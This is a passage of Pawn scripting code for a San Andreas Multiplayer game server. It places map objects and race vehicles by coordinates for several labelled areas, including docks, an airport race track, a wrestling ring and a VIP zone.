	CreateSObject(971, -1413.2221, 1283.0635, 1039.8671, 0.0, 0.0, 23.462, object_show_distance, 16);
	CreateSObject(971, -1426.8216, 1217.8739, 1039.8671, 0.0, 0.0, 132.1666, object_show_distance, 16);
	CreateSObject(971, -1420.649, 1278.9429, 1039.8671, 0.0, 0.0, 35.0554, object_show_distance, 16);
	CreateSObject(971, -1431.3439, 1223.7575, 1039.8671, 0.0, 0.0, 123.3933, object_show_distance, 16);
	CreateSObject(971, -1427.3254, 1273.4919, 1039.8671, 0.0, 0.0, 42.8888, object_show_distance, 16);
	CreateSObject(971, -1434.8936, 1230.7, 1039.8671, 0.0, 0.0, 113.0766, object_show_distance, 16);
	CreateSObject(971, -1436.793, 1253.833, 1039.8671, 0.0, 0.0, 76.4162, object_show_distance, 16);
	CreateSObject(971, -1437.1655, 1238.1148, 1039.8671, 0.0, 0.0, 99.2898, object_show_distance, 16);
	CreateSObject(971, -1437.8707, 1245.867, 1039.8671, 0.0, 0.0, 88.0097, object_show_distance, 16);
	CreateSObject(971, -1434.3182, 1262.0488, 1039.8671, 0.0, 0.0, 67.9561, object_show_distance, 16);
	CreateSObject(971, -1431.3768, 1267.9521, 1039.8671, 0.0, 0.0, 57.2789, object_show_distance, 16);
	CreateSObject(971, -1396.1901, 1286.1743, 1039.8671, 0.0, 0.0, 1.5051, object_show_distance, 16);
	// SiLVeR's Objects:
	CreateSObject(3749, 808.391174, 842.888123, 14.780720, 0.0000, 0.0000, 292.9640);
	CreateSObject(8154, 1383.918701, 756.486328, 12.921340, 0.0000, 0.0000, 179.6226);
	CreateSObject(8151, 1388.514038, 702.435425, 14.038527, 0.0000, 0.0000, 180.4820);
	CreateSObject(8150, 1397.094360, 736.002380, 12.921340, 0.0000, 0.0000, 90.2408);
	CreateSObject(8150, 1397.034058, 725.798828, 12.921341, 0.0000, 0.0000, 90.2408);
	// Anti Gambles:
	CreateSObject(8210, 2236.2271,1657.8861,1008.3594, 0.0000, 0.0000, 180.0000);
	CreateSObject(8210, 1981.9517,1018.2281,994.4688, 0.0000, 0.0000, 90.0000);
	// Docks (BroLeX):
	CreateSObject(6188, -1580.962280, 1394.490112, -9.455555, 0.0000, 0.0000, 78.7500);
	CreateSObject(10305, -1630.548584, 1486.646973, -14.035418, 0.0000, 0.0000, 106.4839);
	CreateSObject(9958, -1530.065918, 1447.326416, 5.895386, 0.0000, 0.0000, 157.5000);
	CreateSObject(13592, -1553.011841, 1489.864380, 15.714907, 0.0000, 0.0000, 0.0000);
	CreateSObject(13592, -1562.598633, 1482.648926, 15.864904, 0.0000, 0.0000, 0.0000);
	CreateSObject(1632, -1544.627197, 1495.474365, 7.219406, 0.0000, 0.0000, 270.0000);
	CreateSObject(1632, -1544.629272, 1491.530151, 7.344405, 0.8594, 359.1406, 266.5623);
	CreateSObject(1632, -1540.871338, 1495.519653, 9.390211, 30.9397, 0.0000, 270.0000);
	CreateSObject(13636, -1651.731567, 1512.190308, 8.171709, 0.0000, 0.0000, 11.2500);
	CreateSObject(13590, -1697.943359, 1471.285889, 7.020113, 0.0000, 0.0000, 22.5000);
	CreateSObject(13638, -1670.906006, 1528.694214, 8.316693, 0.0000, 0.0000, 281.2500);
	CreateSObject(13639, -1714.947510, 1465.572510, 5.612536, 0.0000, 0.0000, 202.5000);
	CreateSObject(13641, -1643.455688, 1456.221069, 7.263512, 0.0000, 0.0000, 315.0000);
	CreateSObject(13647, -1617.636963, 1499.144409, 5.890242, 0.0000, 0.0000, 22.5000);
	CreateSObject(13648, -1617.401855, 1498.557739, 5.890242, 0.0000, 0.0000, 292.5000);
	CreateSObject(3666, -1611.948730, 1388.992188, 8.001230, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, -1616.385498, 1405.213989, 7.994555, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, -1616.313965, 1417.556885, 7.966814, 0.0000, 0.0000, 0.0000);
	CreateSObject(1655, -1609.651001, 1398.919434, 3.862252, 0.0000, 0.0000, 101.2500);
	CreateSObject(1655, -1613.823608, 1398.211548, 6.578233, 16.3293, 0.0000, 101.2501);
	CreateSObject(1655, -1619.529175, 1397.262817, 7.326343, 0.0000, 0.0000, 281.2500);
	CreateSObject(1655, -1716.284058, 1416.536865, 7.044402, 6.0161, 359.1406, 105.7790);
	CreateSObject(1655, -1722.338989, 1415.027466, 7.480116, 0.0000, 0.0000, 287.3434);
	CreateSObject(1660, -1489.617065, 1403.243652, 3.503503, 0.0000, 356.5623, 337.5000);
	CreateSObject(1632, -1541.161255, 1491.385010, 9.527195, 28.3614, 359.1406, 266.5623);
	CreateSObject(6189, -1493.630371, 1425.417725, -11.295256, 0.0000, 356.5623, 339.3735);
	CreateSObject(1655, -1468.063110, 1476.753906, 5.750021, 17.1887, 359.1406, 346.1717);
	CreateSObject(1655, -1466.561523, 1482.300293, 6.682926, 358.2811, 0.0000, 166.1717);
	CreateSObject(3458, -1687.824219, 1411.075928, 1.465467, 0.0000, 0.0000, 45.0000);
	CreateSObject(3458, -1690.671631, 1413.752930, 1.496208, 0.0000, 0.0000, 45.0000);
	// APRace (BroLeX):
	CreateSObject(8147, 1436.471191, -2475.791992, 15.605711, 0.0000, 0.0000, 90.0000);
	CreateSObject(8147, 1582.526489, -2475.725830, 15.555716, 0.0000, 0.0000, 90.0000);
	CreateSObject(8147, 1727.780151, -2475.701416, 15.555716, 0.0000, 0.0000, 90.0000);
	CreateSObject(8147, 1873.047119, -2475.739990, 15.555716, 0.0000, 0.0000, 90.0000);
	CreateSObject(8147, 2019.034302, -2475.716309, 15.565308, 0.0000, 0.0000, 90.0000);
	CreateSObject(987, 2101.540527, -2482.105225, 12.546875, 0.0000, 0.0000, 146.2500);
	CreateSObject(987, 2109.509277, -2490.364502, 12.546875, 0.0000, 0.0000, 135.0000);
	CreateSObject(987, 2117.959717, -2498.884766, 12.546875, 0.0000, 0.0000, 135.0000);
	CreateSObject(987, 2122.152100, -2509.974609, 12.546875, 0.0000, 0.0000, 112.5000);
	CreateSObject(987, 2126.666016, -2520.792969, 12.546875, 0.0000, 0.0000, 112.5000);
	CreateSObject(987, 2128.971436, -2532.445068, 12.546875, 0.0000, 0.0000, 101.2500);
	CreateSObject(987, 2128.891846, -2544.250732, 12.546875, 0.0000, 0.0000, 90.0000);
	CreateSObject(987, 2128.839355, -2555.732910, 12.546875, 0.0000, 0.0000, 90.0000);
	CreateSObject(987, 2126.436279, -2567.107178, 12.546875, 0.0000, 0.0000, 78.7500);
	CreateSObject(987, 2121.510010, -2577.744629, 12.546875, 0.0000, 0.0000, 67.5000);
	CreateSObject(987, 2114.800537, -2587.513916, 12.546875, 0.0000, 0.0000, 56.2500);
	CreateSObject(987, 2105.923584, -2595.672119, 12.546875, 0.0000, 0.0000, 45.0000);
	CreateSObject(987, 2096.109375, -2602.169922, 12.546875, 0.0000, 0.0000, 33.7500);
	CreateSObject(987, 2085.437256, -2606.534180, 12.546875, 0.0000, 0.0000, 22.5000);
	CreateSObject(987, 2073.702881, -2608.582764, 12.546875, 0.0000, 0.0000, 11.2500);
	CreateSObject(8148, 1994.027954, -2608.657227, 15.647902, 0.0000, 0.0000, 270.0000);
	CreateSObject(8148, 1831.959351, -2608.685303, 15.647902, 0.0000, 0.0000, 270.0000);
	CreateSObject(8148, 1670.483521, -2608.691650, 15.647902, 0.0000, 0.0000, 270.0000);
	CreateSObject(8148, 1510.166016, -2608.759033, 15.647902, 0.0000, 0.0000, 270.0000);
	CreateSObject(8148, 1447.094971, -2608.504150, 15.647902, 0.0000, 0.0000, 270.0000);
	CreateSObject(8148, 1444.907837, -2512.945801, 15.647902, 0.0000, 0.0000, 270.0000);
	CreateSObject(8148, 1606.961670, -2512.956787, 15.647902, 0.0000, 0.0000, 270.0000);
	CreateSObject(8148, 1768.530396, -2512.955811, 15.647902, 0.0000, 0.0000, 270.0000);
	CreateSObject(8148, 1930.414307, -2512.928711, 15.647902, 0.0000, 0.0000, 270.0000);
	CreateSObject(8148, 1995.492554, -2512.934082, 15.647902, 0.0000, 0.0000, 270.0000);
	CreateSObject(987, 2076.052002, -2513.502197, 12.546875, 0.0000, 0.0000, 326.2500);
	CreateSObject(987, 2085.865967, -2520.243408, 12.546876, 0.0000, 0.0000, 292.5000);
	CreateSObject(987, 2090.279541, -2531.275879, 12.546875, 0.0000, 0.0000, 270.0000);
	CreateSObject(987, 2090.140625, -2543.188965, 12.553168, 0.0000, 0.0000, 270.0000);
	CreateSObject(987, 2089.947266, -2555.181885, 12.546875, 0.0000, 0.0000, 247.5000);
	CreateSObject(987, 2085.309082, -2566.207275, 12.546875, 0.0000, 0.0000, 213.7500);
	CreateSObject(8148, 1993.962769, -2573.031494, 15.647902, 0.0000, 0.0000, 90.0000);
	CreateSObject(8148, 1831.964966, -2573.033447, 15.647902, 0.0000, 0.0000, 90.0000);
	CreateSObject(8148, 1669.962402, -2573.064453, 15.647902, 0.0000, 0.0000, 90.0000);
	CreateSObject(8148, 1507.936768, -2573.064453, 15.647902, 0.0000, 0.0000, 90.0000);
	CreateSObject(8148, 1437.910889, -2573.059326, 15.647902, 0.0000, 0.0000, 90.0000);
	CreateSObject(8148, 1365.592163, -2529.015137, 15.647902, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1489.667603, -2499.609375, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1490.743408, -2488.205811, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1481.929810, -2494.090088, 12.960444, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1519.027222, -2486.121338, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1528.900024, -2501.788818, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1549.531006, -2484.983643, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1550.760742, -2493.593018, 12.960442, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1550.780640, -2501.874512, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1588.862061, -2488.706787, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1590.303955, -2501.351563, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1616.700195, -2493.160156, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1621.538086, -2486.644287, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1632.956665, -2503.445068, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1646.132080, -2488.991943, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1667.874268, -2500.370850, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1692.814697, -2486.538086, 12.960442, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1712.684814, -2499.493652, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1676, 1736.417969, -2487.155762, 14.135554, 0.0000, 0.0000, 90.0000);
	CreateSObject(1676, 1748.051880, -2501.460938, 14.135550, 0.0000, 0.0000, 90.0000);
	CreateSObject(1676, 1793.381836, -2494.075684, 14.135554, 0.0000, 0.0000, 90.0000);
	CreateSObject(1686, 1830.427002, -2485.459229, 12.567991, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1814.994629, -2500.583740, 12.960444, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1862.661377, -2497.447266, 12.960443, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1890.983154, -2486.923828, 12.944873, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1909.672729, -2500.747803, 12.944872, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1947.107178, -2488.432861, 12.944873, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1976.634644, -2502.865479, 12.944874, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1986.704102, -2487.660889, 12.944873, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 2008.647583, -2501.120605, 12.944873, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 2029.434326, -2487.897949, 12.944873, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 2078.335449, -2496.011719, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 2102.512207, -2501.064697, 12.944871, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 2095.769043, -2527.516357, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 2108.795410, -2550.937744, 12.944871, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 2097.940186, -2564.317627, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 2102.315918, -2586.679688, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1676, 2067.396973, -2580.693848, 14.127742, 0.0000, 0.0000, 281.2500);
	CreateSObject(1676, 2031.850586, -2597.928711, 14.127742, 0.0000, 0.0000, 270.0000);
	CreateSObject(1676, 2002.072021, -2584.745605, 14.127742, 0.0000, 0.0000, 270.0000);
	CreateSObject(1225, 1959.404419, -2601.713623, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1935.606567, -2584.220459, 12.952631, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1908.712158, -2600.082031, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1676, 1876.041626, -2584.406982, 14.127742, 0.0000, 0.0000, 270.0000);
	CreateSObject(1676, 1849.446655, -2600.897949, 14.127742, 0.0000, 0.0000, 270.0000);
	CreateSObject(1225, 1821.578247, -2584.745605, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1782.945557, -2599.956055, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1737.706543, -2587.591553, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1757.893921, -2593.406738, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1714.371826, -2598.074951, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1693.704590, -2585.279297, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1676, 1670.703735, -2600.688721, 14.127743, 0.0000, 0.0000, 270.0000);
	CreateSObject(1676, 1634.403931, -2585.450684, 14.127742, 0.0000, 0.0000, 270.0000);
	CreateSObject(1225, 1618.193115, -2599.125732, 12.952629, 0.0000, 0.0000, 0.0000);
	CreateSObject(1244, 1584.516479, -2584.489014, 13.346378, 0.0000, 0.0000, 0.0000);
	CreateSObject(1676, 1560.019531, -2601.188477, 14.127740, 0.0000, 0.0000, 270.0000);
	CreateSObject(1225, 1542.005371, -2584.743408, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 1535.491211, -2600.572510, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(1676, 1484.222656, -2587.463135, 14.127742, 0.0000, 0.0000, 270.0000);
	CreateSObject(1676, 1485.199097, -2598.580566, 14.127742, 0.0000, 0.0000, 270.0000);
	CreateSObject(1225, 1455.010254, -2592.062500, 12.952630, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1586.474609, -2493.621826, 14.048664, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1768.216919, -2486.109131, 14.048665, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1837.432495, -2501.477539, 14.048665, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1917.622681, -2486.375732, 14.033096, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1991.312256, -2497.332764, 14.033093, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2051.649170, -2499.618652, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2104.121582, -2516.031250, 14.033092, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 2071.699707, -2596.639404, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1994.532959, -2599.737793, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1940.580078, -2593.522217, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1875.243408, -2600.858887, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1784.037598, -2584.156006, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1747.748169, -2601.310059, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1665.950439, -2586.042725, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1646.086914, -2602.272217, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1589.665649, -2601.171875, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1608.498169, -2583.839111, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1542.763550, -2592.503418, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1485.980469, -2593.008545, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1481.333496, -2575.597168, 14.040852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3877, 1489.822144, -2493.980713, 14.220428, 0.0000, 0.0000, 0.0000);
	CreateSObject(7392, 1830.526489, -2493.438477, 20.524776, 0.0000, 0.0000, 0.0000);
	CreateSObject(13562, 1941.878906, -2504.399658, 13.478399, 0.0000, 45.5501, 73.0521);
	CreateSObject(16776, 2090.737793, -2543.684814, 12.154045, 0.0000, 0.0000, 90.0000);
	CreateSObject(2780, 2003.401123, -2585.359375, 12.546875, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, 2004.334229, -2592.300049, 12.546875, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, 2006.290527, -2600.217285, 12.546875, 0.0000, 0.0000, 0.0000);
	CreateSObject(1245, 2011.848755, -2591.380127, 14.034448, 0.0000, 0.0000, 0.0000);
	CreateSObject(1503, 1889.227783, -2598.633789, 12.940992, 0.0000, 0.0000, 90.0000);
	CreateSObject(1631, 1708.214111, -2586.197754, 13.060659, 0.0000, 0.0000, 90.0000);
	CreateSObject(18609, 1566.352905, -2587.343506, 13.719363, 0.0000, 0.0000, 0.0000);
	CreateSObject(16367, 1579.086304, -2494.384766, 14.313576, 0.0000, 0.0000, 180.0000);
	CreateSObject(13645, 2027.125732, -2494.559082, 13.281977, 0.0000, 0.0000, 258.7500);
	CreateSObject(13641, 1814.882690, -2486.175781, 14.023935, 0.0000, 356.5623, 0.0000);
	CreateVehicleEx(411,1398.6278,-2499.0610,13.2818,269.0706,112,1,respawntime,0,0); // Infernus-ApRace
	CreateVehicleEx(411,1398.6477,-2503.1731,13.2818,269.6917,106,1,respawntime,0,0); // Infernus-ApRace
	CreateVehicleEx(451,1398.0806,-2490.0244,13.2607,270.3638,46,46,respawntime,0,0); // Turismo-ApRace
	CreateVehicleEx(451,1397.6757,-2485.1926,13.2606,271.9688,18,18,respawntime,0,0); // Turismo-ApRace
	CreateVehicleEx(522,1396.8192,-2479.3884,13.1147,273.0496,1,1,respawntime,0,0); // NRG500-ApRace
	CreateVehicleEx(522,1396.6797,-2477.4912,13.1291,270.7928,1,1,respawntime,0,0); // NRG500-ApRace
	CreateVehicleEx(522,1397.0996,-2481.1919,13.1254,268.3892,1,1,respawntime,0,0); // NRG500-ApRace
	// WWE (BroLeX):
	CreateSObject(5259, 3332.451660, -1152.639038, 2.076470, 0.0000, 0.0000, 0.0000);
	CreateSObject(5259, 3339.501709, -1152.644653, 2.041955, 0.0000, 0.0000, 0.0000);
	CreateSObject(5259, 3339.619873, -1160.632568, 2.091992, 0.0000, 0.0000, 0.0000);
	CreateSObject(5259, 3332.431885, -1160.630615, 2.084723, 0.0000, 0.0000, 0.0000);
	CreateSObject(5259, 3336.178467, -1156.749023, 4.398240, 0.0000, 0.0000, 0.0000);
	CreateSObject(5259, 3341.994385, -1152.645874, 2.038748, 0.0000, 0.0000, 0.0000);
	CreateSObject(5259, 3330.859375, -1160.607788, 2.034888, 0.0000, 0.0000, 180.0000);
	CreateSObject(5259, 3330.708984, -1152.642212, 2.041353, 0.0000, 0.0000, 180.0000);
	CreateSObject(5259, 3342.038086, -1160.578979, 2.031009, 0.0000, 0.0000, 0.0000);
	CreateSObject(3819, 3343.300293, -1156.884766, 8.310984, 0.0000, 0.0000, 0.0000);
	CreateSObject(3819, 3329.074951, -1156.855713, 8.303715, 0.0000, 0.0000, 180.0000);
	CreateSObject(14781, 3335.787842, -1157.101440, 10.809819, 0.0000, 0.0000, 0.0000);
	CreateSObject(5269, 3330.680908, -1149.635864, 9.606751, 0.0000, 0.0000, 90.0000);
	CreateSObject(5269, 3337.922363, -1149.639893, 9.572237, 0.0000, 0.0000, 270.0000);
	CreateSObject(5269, 3341.914795, -1149.626221, 9.560570, 0.0000, 0.0000, 270.0000);
	CreateSObject(5269, 3346.644287, -1152.697388, 9.531525, 0.0000, 0.0000, 0.0000);
	CreateSObject(5269, 3346.624512, -1160.527588, 9.519348, 0.0000, 0.0000, 0.0000);
	CreateSObject(5269, 3341.878906, -1163.593750, 9.497275, 0.0000, 0.0000, 270.0000);
	CreateSObject(5269, 3333.815674, -1163.598877, 9.515006, 0.0000, 0.0000, 270.0000);
	CreateSObject(5269, 3330.942627, -1163.628662, 9.495472, 0.0000, 0.0000, 90.0000);
	CreateSObject(5269, 3325.739990, -1152.707886, 9.593996, 0.0000, 0.0000, 0.0000);
	CreateSObject(5269, 3325.864502, -1160.675171, 9.479287, 0.0000, 0.0000, 0.0000);
	CreateSObject(5269, 3325.886719, -1160.658936, 14.010459, 0.0000, 0.0000, 0.0000);
	CreateSObject(5269, 3325.747070, -1152.697144, 14.025169, 0.0000, 0.0000, 0.0000);
	CreateSObject(5269, 3330.815186, -1149.602051, 14.012925, 0.0000, 0.0000, 90.0000);
	CreateSObject(5269, 3338.886475, -1149.609375, 14.028410, 0.0000, 0.0000, 90.0000);
	CreateSObject(5269, 3343.623779, -1149.616333, 14.091742, 0.0000, 0.0000, 90.0000);
	CreateSObject(5269, 3346.682373, -1154.629639, 14.062696, 0.0000, 0.0000, 0.0000);
	CreateSObject(5269, 3346.676270, -1160.523071, 14.050520, 0.0000, 0.0000, 0.0000);
	CreateSObject(5269, 3341.737061, -1163.576782, 14.028447, 0.0000, 0.0000, 90.0000);
	CreateSObject(5269, 3333.686279, -1163.578735, 14.046178, 0.0000, 0.0000, 90.0000);
	CreateSObject(5269, 3330.894775, -1163.622070, 14.038326, 0.0000, 0.0000, 270.0000);
	CreateSObject(11472, 3326.958252, -1156.628296, 15.546453, 0.0000, 89.3814, 0.0000);
	CreateSObject(3566, 3337.686523, -1161.004883, 17.308113, 0.0000, 180.4818, 270.0000);
	CreateSObject(3566, 3337.674072, -1157.714844, 17.327053, 0.0000, 180.4818, 270.0000);
	CreateSObject(3566, 3337.670166, -1154.413696, 17.352060, 0.0000, 180.4818, 270.0000);
	CreateSObject(3566, 3337.592041, -1151.131836, 17.389145, 0.0000, 180.4818, 270.0000);
	// VIP (SaMaRa + BroLeX):
	CreateSObject(3749, 1264.073486, -2049.056152, 64.152290, 0.0000, 0.0000, 357.4217);
	CreateSObject(7939, 1161.052734, -1993.592285, 69.560593, 0.0000, 0.0000, 180.0000);
	CreateSObject(7939, 1161.060913, -1993.572388, 70.840218, 0.0000, 0.0000, 180.0000);
	CreateSObject(7939, 1153.820068, -1993.652100, 69.560593, 0.0000, 0.0000, 180.0000);
	CreateSObject(7939, 1153.805542, -1993.646606, 70.951370, 0.0000, 0.0000, 180.0000);
	CreateSObject(8650, 1103.891968, -2008.331909, 69.123146, 0.0000, 0.0000, 0.0000);
	CreateSObject(8650, 1103.934937, -2008.300293, 71.180122, 179.6226, 357.4217, 0.0000);
	CreateSObject(8650, 1103.998535, -2065.058838, 69.123146, 0.0000, 0.0000, 0.0000);
	CreateSObject(8650, 1104.015869, -2065.004883, 71.305130, 179.6226, 359.1406, 0.0000);
	CreateSObject(992, 1101.947998, -2049.516113, 69.513390, 0.0000, 0.0000, 180.0000);
	CreateSObject(992, 1098.657959, -2049.608398, 69.563393, 0.0000, 0.0000, 180.0000);
	CreateSObject(992, 1101.907471, -2024.748779, 69.563393, 0.0000, 0.0000, 0.0000);
	CreateSObject(992, 1098.530029, -2024.774292, 69.538391, 0.0000, 0.0000, 0.0000);
	CreateSObject(8650, 1103.917725, -2009.209595, 69.123146, 0.0000, 0.0000, 0.0000);
	CreateSObject(8650, 1103.963867, -2009.205200, 71.255127, 179.6226, 357.4217, 0.0000);
	CreateSObject(7191, 1283.874268, -2025.676392, 59.827824, 0.0000, 0.0000, 180.0000);
	CreateSObject(7191, 1261.505859, -2002.808960, 60.088036, 359.1406, 0.0000, 270.0000);
	CreateSObject(7191, 1283.869995, -2025.684448, 63.347954, 359.1406, 0.0000, 180.0001);
	CreateSObject(7191, 1261.593872, -2002.786987, 64.042297, 359.1406, 0.0000, 270.0000);
	CreateSObject(8674, 1278.804688, -2047.652100, 59.479076, 0.0000, 0.0000, 358.2811);
	CreateSObject(8674, 1278.759155, -2047.613159, 62.041679, 0.0000, 0.0000, 358.2811);
	CreateSObject(7939, 1159.383423, -2080.425049, 69.385582, 0.0000, 0.0000, 0.0000);
	CreateSObject(7939, 1153.401123, -2080.460693, 69.560593, 0.0000, 0.0000, 0.0000);
	CreateSObject(7939, 1153.419800, -2080.478516, 70.701355, 0.0000, 0.0000, 0.0000);
	CreateSObject(7939, 1159.342651, -2080.461914, 70.701355, 0.0000, 0.0000, 0.0000);
	CreateSObject(16052, 1240.353027, -2037.049072, 60.577591, 0.0000, 0.0000, 90.0000);
	CreateSObject(3627, 1261.808716, -2015.270508, 62.136292, 358.2811, 0.8594, 270.0000);
	CreateSObject(3437, 1245.759033, -2048.794434, 64.892502, 0.0000, 0.0000, 315.0000);
	CreateSObject(3437, 1248.797974, -2048.915771, 64.820724, 0.0000, 0.0000, 303.7500);
	CreateSObject(3437, 1251.721313, -2048.877930, 64.738853, 0.0000, 0.0000, 303.7500);
	CreateSObject(3437, 1282.201416, -2049.732666, 63.867310, 0.0000, 0.0000, 229.2973);
	CreateSObject(3437, 1279.072021, -2049.636963, 64.015579, 0.0000, 0.0000, 231.0161);
	CreateSObject(3437, 1276.307251, -2049.614014, 64.077103, 0.0000, 0.0000, 231.0161);
	CreateSObject(8491, 1091.529541, -2036.738525, 86.772690, 0.0000, 0.0000, 313.2811);
	CreateSObject(8491, 1114.214722, -2069.901855, 82.339195, 0.0000, 0.0000, 348.7500);
	CreateSObject(8491, 1114.520996, -2004.926880, 83.016853, 0.0000, 0.0000, 307.2650);
	CreateSObject(16778, 1175.510376, -2036.962769, 70.874474, 0.8594, 3.4377, 191.2500);
	CreateSObject(3472, 1155.334595, -2052.923096, 68.369766, 0.0000, 0.0000, 45.0000);
	CreateSObject(3472, 1195.015503, -2054.380615, 68.369766, 0.0000, 0.0000, 45.0000);
	CreateSObject(3472, 1154.916870, -2020.596191, 68.369766, 0.0000, 0.0000, 45.0000);
	CreateSObject(3472, 1195.488159, -2020.249634, 68.376968, 0.0000, 0.0000, 45.0000);
	CreateSObject(3267, 1117.679443, -2037.012085, 77.235435, 0.0000, 0.0000, 271.7962);
	CreateSObject(3461, 1174.859619, -2037.065552, 76.031990, 0.0000, 0.0000, 0.0000);
	CreateSObject(9833, 1174.607788, -2073.305420, 71.210358, 0.0000, 0.0000, 0.0000);
	CreateSObject(9833, 1174.930908, -1998.268066, 71.160355, 0.0000, 0.0000, 0.0000);
	CreateSObject(622, 1220.114014, -2060.024902, 65.116898, 0.0000, 0.0000, 303.7500);
	CreateSObject(622, 1219.411377, -2015.618042, 65.003304, 0.0000, 0.0000, 247.5000);
	CreateSObject(8674, 1248.156616, -2046.507568, 63.193108, 0.0000, 0.0000, 357.5763);
	CreateSObject(8674, 1242.979370, -2051.536621, 60.354877, 0.0000, 0.0000, 270.0000);
	CreateSObject(8674, 1242.914917, -2061.840088, 60.341679, 0.0000, 0.0000, 270.0000);
	CreateSObject(8674, 1242.930298, -2066.990234, 60.333549, 0.0000, 0.0000, 270.0000);
	CreateSObject(8674, 1243.006714, -2051.540039, 63.169079, 0.0000, 0.0000, 270.0000);
	CreateSObject(8674, 1242.937378, -2061.828125, 63.163570, 0.0000, 0.0000, 270.0000);
	CreateSObject(8674, 1242.927246, -2067.000488, 63.180050, 0.0000, 0.0000, 270.0000);
	CreateSObject(8674, 1237.760498, -2072.156006, 60.402046, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1237.771240, -2072.149170, 63.143303, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1227.499512, -2072.177979, 62.355923, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1227.459351, -2072.125488, 65.270050, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1217.143677, -2072.131104, 65.701836, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1217.144653, -2072.111572, 68.595993, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1215.919189, -2072.117432, 68.593315, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1227.433350, -2072.117188, 68.146599, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1237.771118, -2072.140137, 65.991501, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1215.926025, -2072.153320, 71.089020, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1217.170044, -2072.128906, 71.107422, 0.0000, 0.0000, 180.0000);
	CreateSObject(8674, 1211.113159, -1998.172607, 69.424133, 0.0000, 0.0000, 268.2811);
